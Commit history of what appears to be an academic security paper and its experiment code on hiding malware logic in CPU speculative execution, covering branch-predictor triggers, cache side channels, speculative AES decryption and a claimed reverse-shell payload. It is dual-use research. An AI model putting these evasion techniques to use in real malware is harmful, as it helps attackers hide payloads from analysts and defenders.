+to obscure the fact that we are using encrypted instructions from the ``real
+world'', thus  the speculative world must do the decryption.
+
+Any observer watching the execution of this program would never see any
+indication of decryption, due to the exploitation of speculative execution. Any
+observation of the executed instructions would not include any of the decryption
+instructions, or loading of keys as they are only done speculatively, and thus
+not shown in any debugging or real world traces of program execution.
+Additionally the observer would be unable to find the executed instructions in
+the ELF file as they are only stored encrypted.
+
+There are numerous challenges for a reverse engineer to overcome to learn how a
+malicious program with this primitive works. As with previous examples, the
+malicious instructions are only executed when the correct trigger program is
+running (priming the jump table predictor \textbf{TK: word for this?}). However,
+when the to-be-executed instructions are executed the reverse engineer cannot
+locate these instructions in the ELF file, or generated source code. These
+instructions (when they even appear) seem to be generated by themselves, with no
+apparent cause. Additionally, there is no indicator that these instructions are
+encrypted as the decryption is done in the speculative world, meaning that no
+decryption (or key interaction) is done in a way visible to a reverse engineer.
+
+This method allows for arbitrary computation that is unobservable to any observer (static or dynamic).
 
@@
 \subsection{Virtual Machines}
-Given the specific constraints that the speculative environment enforces on these 
-paylods, general purpose compuatation []. We demonstrated in section~\ref{subsec:turing} that 
-general purpose computation is possible using computation performed in the 
-speculative environment. However, a turing machine is not a user friendly model,
-nor is it an efficient model for computation when attempting to accomplish tasks
-on modern processors.
+Given the specific constraints that the speculative environment enforces on
+these payloads, general purpose computation []. We demonstrated in
+Section~\ref{subsec:turing} that general purpose computation is possible using
+computation performed in the speculative environment. However, a turing machine
+is not a user friendly model, nor is it an efficient model for computation when
+attempting to accomplish tasks on modern processors.
 
 Using emulators in the "real world" allows for crafted binary programs to be
-instrumented in dead code and, as demonstrated in secton~\ref{subsec:decryption} 
-encrypted and hidden. This gives an advantage to attackers as traditional 
-reverse engineering methods will reveal only that emulation is being done. 
-It reveals nothing about the ultimate goal of the program.
+instrumented in dead code and, as demonstrated in
+Section~\ref{subsec:decryption} encrypted and hidden. This gives an advantage to
+attackers as traditional reverse engineering methods will reveal only that
+emulation is being done. It reveals nothing about the ultimate goal of the
+program.
 

### 2018-05-01 turing/turing.c
move turing test

@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <stdint.h>
 #include <signal.h>
+#include <time.h>
 #include <x86intrin.h>
 #include <unistd.h>
 #include <string.h>
@@ -44,6 +45,12 @@ uint64_t tot_time = 0;      // Number cycles total
 unsigned int junk=0;    // For rdtscp
 
 
+uint8_t rand_xor;
+void init_rand() {
+    srand(time(0));
+    rand_xor = (uint8_t) rand() & 0xff;
+}
+
 void *map;
 #define TARGET_FN_ADDR 0x414100401000
 
@@ -67,6 +74,7 @@ void check_probes() {
     int i;
     for (i=0; i<NUM_PROBES; i++) {
         addr = &probe_buf[i*cur_probe_space];
+        *addr = *addr ^ rand_xor;
         t0 = _rdtscp(&junk);
         asm volatile( "movb (%%rbx), %%al\n"
             :: "b"(addr) : "rax");
@@ -93,6 +101,7 @@ uint64_t jmp_ptr;
 #define TURING_TAPE_LEN 1024*512
 uint8_t *turing_tape;
 uint8_t turing_state;
+
 
 void measure() {
     fn_ptr = check_probes;
@@ -184,6 +193,7 @@ void measure() {
 
 int main()
 {
+    init_rand();
     probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
     if (probe_buf == NULL) {
         perror("malloc");

### 2018-05-02 turing/turing.c
change number of runs

@@ -198,12 +198,8 @@ bool test_Turing(uint8_t move_right, uint8_t write, uint64_t max_i){
     return ret;
 }
 
-void setup(uint8_t *t){
-
-}
-
 void measure() {
-    int runs;
+    const int RUNS = 100;
     fn_ptr = check_probes;
     //jmp_ptr = 0x400e60;
     jmp_ptr = 0;
@@ -222,7 +218,7 @@ void measure() {
         usleep(100);
         uint64_t max_res=0, max_i=0;
         while (1) {
-            for (i=0; i<50; i++) {
+            for (i=0; i<RUNS; i++) {
                 _mm_clflush(&fn_ptr);
                 _mm_clflush(&jmp_ptr);
                 indirect(&jmp_ptr);
@@ -318,6 +314,9 @@ void measure() {
         printf("## Run %03d, Step %08lu State: %d, Symbol: %d | misses: %03d, max_i = %lu\n", experiment, instr, turing_state, *turing_tape, misses, max_i);
         numInstrs[experiment++] = instr;
         instr = 0;
+        cache_hits = 0;
+        tot_runs = 0;
+        tot_time = 0;
     }
 
     FILE *fp = fopen("numInstrs", "w");

### 2018-05-02 turing/turing.c
minor changes

@@ -199,7 +199,7 @@ bool test_Turing(uint8_t move_right, uint8_t write, uint64_t max_i){
 }
 
 void measure() {
-    const int RUNS = 100;
+    const int RUNS = 1000;
     fn_ptr = check_probes;
     //jmp_ptr = 0x400e60;
     jmp_ptr = 0;
@@ -237,7 +237,7 @@ void measure() {
             }
 
             // max_i = max_i ^ rand_xor;
-            if (max_res > 10 && avg < 50){
+            if (max_res > 0.1*RUNS && avg < 50){
                 // printf("[%lu]: %lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld\n", max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space);
                 signal_idx++;
                 instr++;

### 2018-05-02 paper/implementation.tex

@@
 \subsection{AES Decryption}
-
+The speculative world is able to take advantage of the AES-NI instructions to
+decrypt messages. In order to avoid detection (as well as reduce the computation
+that needs to be done in the speculative world) the key expansion can be done
+ahead of time. However, the key schedule does have a structure that could be
+detected by a reverse engineer. Thus 11 random round keys are selected. This
+obfuscated key schedule makes it more difficult for a reverse engineer to
+determine that there is encrypted content. Additionally since the content is
+only accessed when the correct trigger program is running the challenges facing
+a reverse engineer are great.
 % implementation 

### 2018-05-02 paper/payloads.tex

@@
 To demonstrate that arbitrary computation can be done in the speculative world
-we create a Turing Machine to compute a 6 state Busy Beaver Turing Machine.
+we create a Turing Machine to compute a 5 state Busy Beaver Turing Machine. The
+Busy Beaver game is tasked with creating a Turing Machine which writes the most
+1s on the tape with only a limited number of states and still halts.
+
+The computation of the Turing Machine is done speculatively, meaning that while
+the real world keeps track of the state, tape, and symbols of the turing machine
+all logic used to update the above is done in the speculative world.
 
@@
 
-To accomodate both developers as well as the unique constraints 
+To accommodate both developers as well as the unique constraints 
 enforced by the speculative primitive, a custom emulation solution is required. We 
@@
 general purpose emulation using a custom instruction set -- SPASM -- which
-accomodates the speculative primitive specifically. Next we investigate custom 
+accommodates the speculative primitive specifically. Next we investigate custom 
 wrappers on traditional emulators allow for similar payload construction,

### 2018-05-03 turing/plots.py
update turing experiment to test priming jump number

@@ -1,20 +1,60 @@
 #! /usr/bin/env python
 import numpy as np
 import matplotlib.pyplot as plt
+import sys
 
-f = open("numInstrs", "r")
-l = f.readline()
-l = [int(i) for i in l.split()]
-l = np.sort(l)
-ma = np.max(l)
-mi = np.min(l)
+filename = ""
+if len(sys.argv) > 1 :
+    filename = sys.argv[1]
+else:
+    filename = "numInstrs"
+f = open(filename, "r")
 
-nl = l.astype(float)/np.sum(l)
-X = np.linspace(mi, ma, 1000)
-CY = np.cumsum(nl)
-plt.plot(X, CY)
-plt.title("Percentage of Turing Machine instructions completed (CDF)")
-plt.xlabel("Number of instructions completed")
-plt.ylabel("Percentage of runs completing that number of instructions")
-plt.savefig("instructionsCDF")
+maxes = []
+mins = []
+meds = []
+means = []
+numJumps = [] 
+
+with open(filename, "r") as f:
+    l = f.readline() # jump number
+    while l:
+        numJumps.append(int(l.split()[1]))
+        l = f.readline() # data
+        l = [int(i) for i in l.split()]
+        l = np.sort(l)
+        ma = np.max(l)
+        maxes.append(ma)
+        mi = np.min(l)
+        mins.append(mi)
+        med = np.median(l)
+        meds.append(med)
+        mean = np.mean(l)
+        means.append(mean)
+        l = f.readline() # jump number
+
+print("numJumps = " + str(numJumps))
+print("mins = " + str(mins))
+plt.plot(numJumps, mins, label="minimums")
+plt.subplot()
+plt.plot(numJumps, maxes, label="maximums")
+plt.subplot()
+plt.plot(numJumps, meds, label= "medians")
+plt.subplot()
+plt.plot(numJumps, means, label= "means")
+plt.legend()
+
+plt.xlabel("Number of priming jumps")
+plt.ylabel("Number of steps before first error")
+plt.title("Affect number of priming jumps has on success")
 plt.show()
+
+# nl = l.astype(float)/np.sum(l)
+# X = np.linspace(mi, ma, 1000)
+# CY = np.cumsum(nl)
+# plt.plot(X, CY)
+# plt.title("Fraction of Turing Machine instructions completed (CDF)")
+# plt.xlabel("Number of instructions completed")
+# plt.ylabel("Fraction of runs completing that number of instructions")
+# plt.savefig("instructionsCDF")
+# plt.show()

### 2018-05-03 turing/turing.c

@@ -44,9 +44,7 @@ uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
 uint64_t tot_time = 0;      // Number cycles total
 uint64_t R = 1;
 uint64_t L = 0;
-uint64_t numInstrs[1000];
 #define MAX_EXPERIMENT 1000
-int experiment = 0;
 
 unsigned int junk=0;    // For rdtscp
 
@@ -198,8 +196,14 @@ bool test_Turing(uint8_t move_right, uint8_t write, uint64_t max_i){
     return ret;
 }
 
+// const int MINJUMPS = 2;
+#define MINJUMPS 2
+// const int MAXJUMPS = 10;
+#define MAXJUMPS 10
+// const int JUMPINC = 2;
+#define JUMPINC 2
+uint64_t numInstrs[((MAXJUMPS-MINJUMPS)/JUMPINC)][1000];
 void measure() {
-    const int RUNS = 1000;
     fn_ptr = check_probes;
     //jmp_ptr = 0x400e60;
     jmp_ptr = 0;
@@ -207,121 +211,137 @@ void measure() {
 
     uint8_t *turing_tape_base = malloc(TURING_TAPE_LEN);
 
-    while(experiment < MAX_EXPERIMENT){
-        memset(turing_tape_base, 0, TURING_TAPE_LEN);
-        turing_tape = &turing_tape_base[TURING_TAPE_LEN/2];
-        turing_state = 0;
-        true_turing_state = 0;
-        true_max_i = 0;
-        int misses = 0;
-        // printf("## Run %03d, Step %08lu State: %d, Symbol: %d | misses: %03d\n", experiment, instr, turing_state, *turing_tape, misses);
-        usleep(100);
-        uint64_t max_res=0, max_i=0;
-        while (1) {
-            for (i=0; i<RUNS; i++) {
-                _mm_clflush(&fn_ptr);
-                _mm_clflush(&jmp_ptr);
-                indirect(&jmp_ptr);
-                //((void(*)(void *))map)(&jmp_ptr);
-                usleep(1);
-            }
-            uint64_t avg = 0;
-            if (cache_hits > 0) avg = tot_time/cache_hits;
-
-            max_res=0, max_i=0;
-            for (i=0; i<NUM_PROBES; i++) {
-                if (results[i]>max_res) {
-                    max_res = results[i];
-                    max_i = i;
+    for (int jump = MINJUMPS; jump < MAXJUMPS; jump += JUMPINC){
+        int experiment = 0;
[…]

### 2018-05-03 paper/architecture.tex

@@
     \centering
-        \includegraphics[width=0.5\textwidth]{figures/Speculative_capacity.png}
-    \caption{}
+        \includegraphics[width=0.5\textwidth]{figures/speculative_measurements.png}
+    \caption{The speculative primitive allows for a limited number of instructions
+        to be completed speculatively, dependent on multiple factors. A) The 
+        processor generation determines the maximum ROB size and PRF capacity,
+        however intel xeon E3-1270(warm colors) and i5-7200U both (cool colors) 
+        perform similarly for comparable instructions. B) Because trigger and 
+        payload processes must share cpu resources they must be performed on 
+        the same hyperthread or associated parity hyperthreads. Processes on
+        the parity hyperthreads (warm colors) denoted by (P) accomplish a 
+        significantly lower number of instructions as compared with processes 
+        on the same hyperthread (cool colors).}
     \label{fig:spec-capacity}
@@
 entire size provided by the ROB, as determined in section~\ref{sssec:ROB}. This includes 
-idomatic no-ops, which have no effect on the registers, for example the instruction 
-"xchg \%rax \%rax" or similarly "xor \%rax, \%rax". However, if an instruction
-has the potential to cause data dependencies, it must use an entry in the PRF
+idomatic no-ops and zero idioms, which have no reliance on register values, 
+for example the instruction \textit{xchg \%rax \%rax} and \textit{xor \%rax, \%rax}. 
+However, if an instruction is a potential data hazard, it must use an entry in the PRF
 until it reaches the correct stage in the execution pipeline. In this case, the number 
-of instructions is limited by the PRF entries available
+of instructions is limited by the PRF entries available.
 

### 2018-05-03 paper/implementation.tex

@@
 only accessed when the correct trigger program is running the challenges facing
-a reverse engineer are great.
+a reverse engineer are great. We discuss further methods for obfuscating specualtive
+decryption in section~\ref{subsec:future-work}.
+
+We have implemented the AES decryption as a fundamental piece of the \speculake model,
+and we demonstrate that the speed at which information can be decrypted using the speculative 
+primitive is dependent on the configuration of the \speculake model. Specifical,
+the channel width and the required minimum signal strength determine the maximum
+throughput that can be acheived. As demonstrated in Figure~\ref{fig:spec_bangwidth} 
+between 6 and 8 bits channel width provides an idea of the maximum speed at which the 
+speculative primitive can be used with AES-NI instructions in the payload.
+
+While the \speculake model acheives only moderate decryption speed, the 
+critical computation of the decryption is done in the speculative world.
+
+\begin{figure}[t]
+    \centering
+        \includegraphics[width=0.5\textwidth]{figures/spec_bandwidth}
+    \caption{Using the speculative primitive to decrypt 1KB of data
+        we have classified the speed at which data can be exfiltrated
+        from the speculative world. Varying the width of the channel 
+        results in competing performance factors -- decreasing the 
+        number of loops vs decreased size of the probe space.}
+    \label{fig:spec_bandwidth}
+\end{figure}
+
 % implementation 

### 2018-05-03 paper/paper.tex

--- 2018-04-24 paper/paper.tex
@@
 
-%%%%%%%%%%%%%%
-\section{Introduction}
+\input{introduction.tex}
 
-Modern CPU designs use speculative execution to maintain high instruction
-throughput, with the goal of improving performance. In speculative execution,
-CPUs execute likely future instructions while they wait for other slower
-instructions to complete. When the CPU's guess of future instructions is correct, the
-benefit is faster execution performance. When its guess is wrong, the CPU
-simply discards the speculated results and continues executing along the true path.
+\input{background.tex}
 
-Previously, it was assumed that speculative execution results
-remain invisible if discarded, as careful CPU design maintains strict separation
-between speculative results and updates to architectual state.
-However, recent research has revealed side channels that violate this
-separation, and researchers have demonstrated ways to exfiltrate results from speculative
-computation. Most notably, the Spectre vulnerability allows attackers to leak
-information from purposefully mis-speculated branches in a victim
-process~\cite{spectre}. The Meltdown vulnerability uses speculative results of an
-unauthorized memory read to sidestep page faults and leak protected memory from
-the kernel~\cite{meltdown}. Both of these vulnerabilities focus on extracting
-secret data from a process or operating system.
+\input{architecture.tex}
 
-\medskip
+\input{payloads.tex}
 
-In this paper, we explore another attack enabled by speculative execution:
-\speculake, which \emph{hides computation} within
-the ``speculative world''. Taking advantage of the CPU's speculation to secretly
-perform computation,
-we can produce binaries that thwart existing reverse engineering
-techniques. Because the speculative parts of a program never ``truly'' execute,
-we can hide program functionality in the unreachable dead code in a program.
-Even a full instruction trace, captured by a hardware debugger or software
-emulator, will be unable to capture the logic performed speculatively.
-This technique could lead to sophisticated malware that hides its behavior
-from both static and dynamic analysis.
+\input{implementation.tex}
 
-Existing malware use several techniques to evade detection and
-make it difficult for analysts to determine payload behavior of reported malware. 
-For example, binary \emph{packers} or \emph{crypters} encode an executable payload as
-data that must be ``unpacked'' at runtime, making it difficult to tell
-statically what a program will do~\cite{malware-packers}. Malware may also use
-\emph{triggers} that only run the payload when certain conditions are present, preventing
-it from executing when it is inside an analysis sandbox or debugger.
+\input{discussion.tex}
 
-However, with some effort, these existing techniques can be defeated. Analysts can use
-dynamic execution to unpack malware and reveal its
-behavior~\cite{balzarotti2010efficient}, and can use symbolic execution or code
-coverage fuzzers to determine the inputs or triggers that will reveal malicious
-behavior~\cite{moser2007exploring,schwartz2010all,wang2017angr,egele2012survey}.
+\input{related-work.tex}
 
-\speculake provides a new technique to malware authors, allowing them to hide
-program functionality in code that does not execute at runtime.
-
-At a high level, \speculake consists of two parts: a payload program, and a
-trigger program. When run by itself, the payload program executes a pattern of
-indirect jumps and measures a cache side channel. While the trigger program is
-not running, the payload program is effectively inactive (and may optionally do some
-decoy operation). When the trigger program runs, it executes a similar pattern of
-indirect jumps (with similar source and destination addresses as the payload
-program), effectively training the CPU's branch predictor to the jump pattern
-specified by the trigger program.
-
-Importantly, the trigger program and payload
-program's indirect jump patterns diverge on the destination of their final jumps.
-However, because the trigger program has trained the CPU's branch predictor, the
-CPU speculates that the payload program will continue following the pattern of
-the trigger program, causing it to speculatively execute a
-\emph{target function} in the payload program. We emphasize that this target
-function is in a region that is neither read nor executed by the payload
-program, and after the CPU discovers the mis-speculation in the payload program,
-it will discard the results from the target function and continue executing from
-the correct destination. However, the payload program has a limited speculative
-window where it can perform computation in the target function, and can
-communicate results back to the ``real world'' payload program via a cache side
-channel.
-
-While it's possible for the trigger and payload programs to be bundled in a
-single program, an analyst aware of \speculake could easily find the target
-function in the payload program based on the jump pattern in the trigger program.
-However, if the trigger and payload are kept separate, the analyst has a much
-harder job and must identify both.
-Moreover, it is possible that the trigger program be a
-seemingly-unrelated benign program already on the victim's computer. We
-investigate using the OpenSSL library as a benign trigger
-program in Section~\ref{sec:tk}. If the trigger program is another benign
-program on the system, the analyst has the difficult task of identifying which
-program, library, or even operating system component is responsible for training
-the CPU's branch predictor, and finding the specific set of jumps that occur at
-runtime. To make matters worse, the payload program can include dummy jump
-patterns that are effectively dead ends for the analyst, as they do not
-ultimately call the target function speculatively.
-
-Simulating or modelling the speculative execution path is a difficult task for a
-program analyst hoping to reverse engineer an \speculake binary. First, the
-analyst must reverse engineer and accurately model the closed-source proprietary
-components of the target CPU, including the branch predictor, cache hierarchy,
-out-of-order execution, and hyperthreading. In contrast, the \speculake
-author only has to use a partial model of these components and produce binaries
-that take advantage of them, while the analyst's model must be complete to
-capture all potential \speculake uses. Second, the analyst must run all
-potential trigger programs through the simulator, including benign programs with
-realistic inputs. Both of these contribute to a time-consuming and expensive
-endeavor for would-be analysts.
-
-% Results summary
-In order to study the potential of \speculake, we implement several example
-payload programs and evaluate their performance.
-We find that the speculative window is limited mainly by the reorder buffer
-size, and confirm that we are able to execute between 100 and 200 instructions
-speculatively on modern Intel CPUs. While brief, we are able to perform
-execution in short steps, communicating intermediate results back to the ``real
-world'' part of the payload program. Using this technique,
-we demonstrate implementing a universal Turing machine
-(demonstrating arbitrary computation), a custom instruction set architecture
-that fits within the constraints of speculative execution, and show
-the ability to perform AES decryption
-of a payload via AES encrypt/decrypt instructions.
-
-Using these building blocks, we demonstrate the practicality of hiding arbitrary
-computation by decrypting an AES-encrypted ARM binary in the speculative world
-one instruction at a time, returning the decrypted next instruction to the real
-world part of the payload program, which updates a virtual machine. We show that
-we are able to decrypt and process approximately 25 instructions per second.
-
-% contributions?
-% - explore the limits of speculative execution
-% - propose novel concept of hiding computation in speculative execution
-% - implement example applications using this concept, including decrypting
-%   data speculatively
-% - demonstrate using benign program (openssl) as trigger
-% - identify defenses and discuss ways to counter them
-
-% TODO: we don't talk at all about how an analyst might try to enumerate
-% the potential entry points to the speculative world, and how that can be
-% made difficult
-
-%%%%%%%%%%%%%%
-\section{Background}
-Modern CPU designs employ a wide range of tricks in order to maximize
-performance. In this section, we provide preliminary background as they are
-relevant to our system, as well as a brief summary of the Spectre vulnerability.
-
-\subsection{Out-of-Order Execution}
-Many CPUs attempt to keep the pipeline full by executing instructions \emph{out of
-order}, with the CPU allowing future instructions to be worked on and executed
-while it waits for slower or stalled instructions to complete. To maintain
-correctness and the original (Von Neumann) ordering, instructions are tracked in
-a \emph{reorder buffer} (ROB), which keeps the order of instructions as they are
-worked on out of order. Instructions are \emph{retired} from the ROB when
-they are completed and there are no previous instructions that have yet to
-retire. Upon retiring, an instruction's results are committed to the architectural
-state of the CPU. Thus, the ROB ensures that the program (or debugger) view
-of the CPU state always updates in program execution order, despite out of order
-execution.
-
-\subsection{Speculative Execution}
-
-CPUs also attempt to keep their pipeline full by predicting the path of
-execution. For example, a program may contain a branch that depends on a result
-from a prior slow instruction. Rather than wait for the result, the CPU can
-\emph{speculatively execute} instructions down one of the paths of a branch,
-storing the results of the speculative instructions in the ROB.
-If the guess of the branch target turns out to be correct, the CPU can quickly
-retire all the instructions it has speculatively executed while waiting. If the
-guess is incorrect, the CPU must discard the
-(incorrectly) speculated instructions from the ROB, and continue executing from the
-correct branch target.
-
-\subsection{Branch Prediction}
-When a CPU mispredicts a branch, the speculative execution results are
-discarded, costing the CPU several cycles as the pipeline is flushed. To
-minimize this, CPUs employ \emph{branch predictors} that attempt to guess the
-path of execution. Branch predictors maintain a short history of previous
-branch targets for a particular branch (e.g. whether a certain branch is
-frequently taken or not taken), and use
-this to inform the CPU's guess for speculative execution.
-
-There are two kinds of branches a CPU handles: \emph{direct} and
-\emph{indirect}. A \emph{direct} branch may either jump to a provided address or
-continue executing straight through depending on the state of the CPU (e.g. condition
-registers). While there are only two potential statically-known targets for a direct
-branch, the CPU may not know if the branch is taken or not until preceding
-instructions retire. An \emph{indirect} branch is always taken, but its address
-is determined by the value of a register or memory address. Direct branches are
-typically used for control flow such as \texttt{if} or
-\texttt{for}/\texttt{while} statements, while indirect branches are used for
-function pointers, class methods, or case statements.
-
-%- BHB, BTB
-
-\subsection{Spectre}
-
-In early 2018, researchers revealed the Spectre vulnerability, which allows an
-attacker to leak information from a victim program~\cite{specte}. Spectre uses
-the fact that speculative execution can influence system state via side
-channel. In Spectre, an attacker mistrains the branch predictor of a CPU running
-a victim program by providing inputs to it. Once mistrained, the attacker then
-sends a new input that will cause a different in-order execution path. However,
-because the CPU's branch predictor has been mistrained, it will still
-speculatively execute the previous path.
-
-Consider the following code snippet from the Spectre
-paper~\cite{spectre}:
-
-\begin{lstlisting}
-    if (x < array1_size)
-        y = array2[array1[x] * 256];
-\end{lstlisting}
-
-The \texttt{if} statement correctly protects an out-of-bounds reads from \texttt{array1}.
-But if the branch predictor makes an incorrect guess on the branch's direction
-and speculatively executes inside the \texttt{if} statement, it may
-cause a read beyond the boundary of \texttt{array1}. The result of this will
-then (speculatively) be multiplied by 256 and used as an index into
-\texttt{array2}. Although the CPU will not commit
-the speculative update to \texttt{y}, it will still issue a memory read to
-\texttt{array2[array1[x]*256]}, which will be cached. Importantly, even after
-the CPU realizes the branch misprediction, it does not rollback the
-state of the cache, as this does not directly influence program correctness.
-However, the set of cached values is observable to the program via a
-side-channel: by timing reads to \texttt{array2[i]}, the fastest read will
-reveal the speculative value of \texttt{array1[x]*256}, for any value of
-\texttt{x}. An attacker that is able to perform such a side-channel inference on
-the cache can learn the speculative result of an out-of-bounds read from
-\texttt{array1}.
-
-Spectre can also be applied to indirect branches. Branch predictors use the
-history of previous branches to predict the destination of an indirect jump when
-the destination is not yet known. For direct branches, only one of two
-destinations (taken or not taken) are possible to speculatively execute. But for
-indirect branches, a mistrained branch predictor can potentially be coerced into
-speculatively executing from \emph{any} target instruction in the binary.
-
-TODO more on why this is crucial...
-
-%%%%%%%%%%%%%%
-\section{Architecture}
-
-\speculake malware is comprised of two independent programs: a payload program, and a
-trigger program. Both are installed on the victim's computer (e.g. via trojan, remote
-exploit, or phishing), a
-
-Two parts: payload program, and trigger program. Could be combined, but need not
-be. Describe high-level concept of parts
-
-\subsection{Limits of Speculative Execution}
-- Limits of speculative execution (number of instructions)
-- Experiment w/ graph of number of instructions
-- Limitation is in the ROB
-
-\subsection{Speculative Primitive}
-- Primitive: Perform several hundred arbitrary instructions in the speculative
-world, then return fixed-length value to the real world.
-- Trade off number of bits for speed when performing cache side channel.
-
-%%%%%%%%%%%%%%
-\section{Application Payloads}
-
-Given the speculative primitive, what can we do with it?
-
-Finite state machine...
-
-\subsection{Turing Machine}
-- Arbitrary computation
-
-\subsection{Unpacking and Decryption}
-- AES instructions
-
-\subsection{Virtual Machines}
-
-%%%%%%%%%%%%%%
-\section{Trigger Programs}
-Easy answer: custom program that mistrains branch predictor
-
-\subsection{Benign Triggers}
-Could also be any program on the system, and potentially remote!
-
-\subsection{Complex Triggers}
-When considering packers and crypters used in modern malware it is not uncommon to see 
-a malicious sample packed using multiple stages with different unpacking conditions. 
-Whether that be red pills, or environent checks, or network triggers, the reliance is on
-complexity to fool any reverse engineer out of finding the correct conditions to 
-release the full payload.
-
-Similarly \speculake can be instrumented to use more than one trigger. Multiple stages 
-can be designed used any combination of crafted or benign trigger programs. Only when all
-stages have been run to completion in order will the malicious payload be revealed.  
-In conjunction with this each stage cna use a randomized ISA to a common emulator, or 
-they can use differnt emulators all together.
-
-Alternatively each stage could be used to decrypt the next AES key-schedule to decrypt 
-a subsequent layer. Using this model we can instrument \speculake malware as a crypter 
-with the keys hidden in data or dead code which static and dynamic reverse engineering 
-methods will overlook.
-
-%%%%%%%%%%%%%%
-\section{Implementation and Evaluation}
-
-\subsection{Turing Machine}
-
-\subsection{AES Decryption}
-
-\subsection{Virtual Machine}
-
-\subsection{OpenSSL Trigger}
-
-%%%%%%%%%%%%%%
-\section{Discussion}
-
-\subsection{Defenses}
-
-\subsection{Future Work}
-
-%%%%%%%%%%%%%%
-\section{Related Work}
-
-%%%%%%%%%%%%%%
 \section{Conclusion}

### 2018-05-03 paper/introduction.tex
intro quick pass
fixup claims in intro

@@
 
-However, with some effort, these existing techniques can be defeated. Analysts can use
+However, with some effort, these existing malware techniques can be defeated.
+Analysts can use
 dynamic execution to unpack malware and reveal its
@@
 payload programs and evaluate their performance.
-We find that the speculative window is limited mainly by the reorder buffer
-size, and confirm that we are able to execute between 100 and 200 instructions
+We find that the speculative window is limited by the reorder buffer
+and physical register file sizes, which allows us to execute between 100 and 200 instructions
 speculatively on modern Intel CPUs. While brief, we are able to perform
@@
 Using these building blocks, we demonstrate the practicality of hiding arbitrary
-computation by decrypting an AES-encrypted ARM binary in the speculative world
-one instruction at a time, returning the decrypted next instruction to the real
-world part of the payload program, which updates a virtual machine. We show that
-we are able to decrypt and process approximately 25 instructions per second.
+computation by implementing a reverse shell in our speculative instruction set.
+We show that this simple payload is able to perform several system calls
+in a reasonable time, ultimately launching a dial-back TCP shell in under 8~seconds after
+the trigger program starts.
+
+%Using these building blocks, we demonstrate the practicality of hiding arbitrary
+%computation by decrypting an AES-encrypted ARM binary in the speculative world
+%one instruction at a time, returning the decrypted next instruction to the real
+%world part of the payload program, which updates a virtual machine. We show that
+%we are able to decrypt and process approximately 25 instructions per second.
 
@@
 
+% Move to discussion:
 % TODO: we don't talk at all about how an analyst might try to enumerate

### 2018-05-03 paper/figures.tex
add high-level figure

\newcommand{\FigHighLevel}{

\begin{figure}[ht]
    \centering
    \includegraphics[clip, trim=3cm 13cm 3cm 5cm, width=\linewidth]{figures/exspectre-high-level.pdf}
    \caption{\textbf{Exspectre}\,---\, %
    1, 2, 3, 4...}

    \label{fig:high-level}

\end{figure}
}

### 2018-05-04 paper/architecture.tex
indirect jumps pass

@@
 
+In \speculake, we cause the CPU to mis-speculate the destination of an indirect
+branch in the payload program, causing it to speculatively execute from an
+instruction that is never truly executed. We term this speculative destination the
+\emph{speculative entry point}.
+\speculake uses indirect jumps to allow speculatively executing from \emph{any}
+instruction in the payload process' address space. Because it can jump to any
+instruction, the malware analyst has a difficult task in determining where a
+payload program's speculative entry point is.
+
+In fact, the location this entry point is not determined by the payload
+program, but rather the corresponding trigger program. This means that with only
+the payload program, an analyst does not posses enough information to find the
+speculative entry point.
+
 Indirect branch predictors allow the CPU to predict the destination address of a
@@
 
-We created a simple trigger program that performs a series of 32 indirect jumps,
-using the \texttt{jmpq *\%rax} instruction. Between each jump, we increment
+We observe that Intel CPUs consider three types of x86\_64 indirect branches:
+\texttt{retq}, \texttt{callq *\%rax}, and \texttt{jmpq *\%rax}\footnote{other
+general purpose registers besides \texttt{\%rax} can be used as well}.
+We created a simple trigger program that performs a series of 32 indirect
+branches
+using \texttt{jmpq *\%rax} instructions. Between each jump, we increment
 \texttt{\%rax} to account for the number of bytes between jumps. For the last
 jump, we load a function pointer into \texttt{\%rax} and do a final indirect
-jump using \texttt{callq \%rax}.
+branch using \texttt{callq *\%rax}.
 
@@
 address, and second, the location of the function pointer in memory is uncached.
-This forces the CPU to predict the destination of the indirect call, which it
-predicts to be the destination of the function pointer in trigger program. In
-the payload program, we purposefully place code at this address which acts as
-the \emph{speculative entry point}. Even though the in-order execution of
+This forces the CPU to predict the destination of the indirect call while it
+waits for the function pointer to load from memory. Due to the similarity
+history of branches with the trigger program,
+the CPU will (incorrectly) predict the destination to be the same as the one in
+the trigger program, which determines the speculative entry point for the
+payload. Even though the in-order execution of
 payload program never executes or even reads from this address, the CPU will
@@
 results to the ``real world'' program.
-
-TODO: Note that returns can also be indirect jumps, and rets/jmpq can be mixed
-to a certain extent...need to document/quantify how much mixing can be done
-still.
 

### 2018-05-04 paper/architecture.tex
move figure to figures

--- 2018-05-03 paper/architecture.tex
@@
 
-\begin{figure}[t]
-    \centering
-        \includegraphics[width=0.5\textwidth]{figures/speculative_measurements.png}
-    \caption{The speculative primitive allows for a limited number of instructions
-        to be completed speculatively, dependent on multiple factors. A) The 
-        processor generation determines the maximum ROB size and PRF capacity,
-        however intel xeon E3-1270(warm colors) and i5-7200U both (cool colors) 
-        perform similarly for comparable instructions. B) Because trigger and 
-        payload processes must share cpu resources they must be performed on 
-        the same hyperthread or associated parity hyperthreads. Processes on
-        the parity hyperthreads (warm colors) denoted by (P) accomplish a 
-        significantly lower number of instructions as compared with processes 
-        on the same hyperthread (cool colors).}
-    \label{fig:spec-capacity}
-\end{figure}
+\FigSpecMeasure
 

### 2018-05-04 paper/figures.tex
better trim
figure scale
trimmed figure
move figure to figures

@@
     \centering
-    \includegraphics[clip, trim=3cm 13cm 3cm 5cm, width=\linewidth]{figures/exspectre-high-level.pdf}
+    \includegraphics[clip, trim=6cm 13.5cm 3.8cm 5cm, width=0.9\linewidth]{figures/exspectre-high-level.pdf}
     \caption{\textbf{Exspectre}\,---\, %
@@
 }
+
+\newcommand{\FigSpecMeasure}{
+\begin{figure*}[t]
+    \centering
+        \includegraphics[width=0.9\textwidth]{figures/speculative_measurements.png}
+    \caption{The speculative primitive allows for a limited number of instructions
+        to be completed speculatively, dependent on multiple factors. A) The 
+        processor generation determines the maximum ROB size and PRF capacity,
+        however intel xeon E3-1270(warm colors) and i5-7200U both (cool colors) 
+        perform similarly for comparable instructions. B) Because trigger and 
+        payload processes must share cpu resources they must be performed on 
+        the same hyperthread or associated parity hyperthreads. Processes on
+        the parity hyperthreads (warm colors) denoted by (P) accomplish a 
+        significantly lower number of instructions as compared with processes 
+        on the same hyperthread (cool colors).}
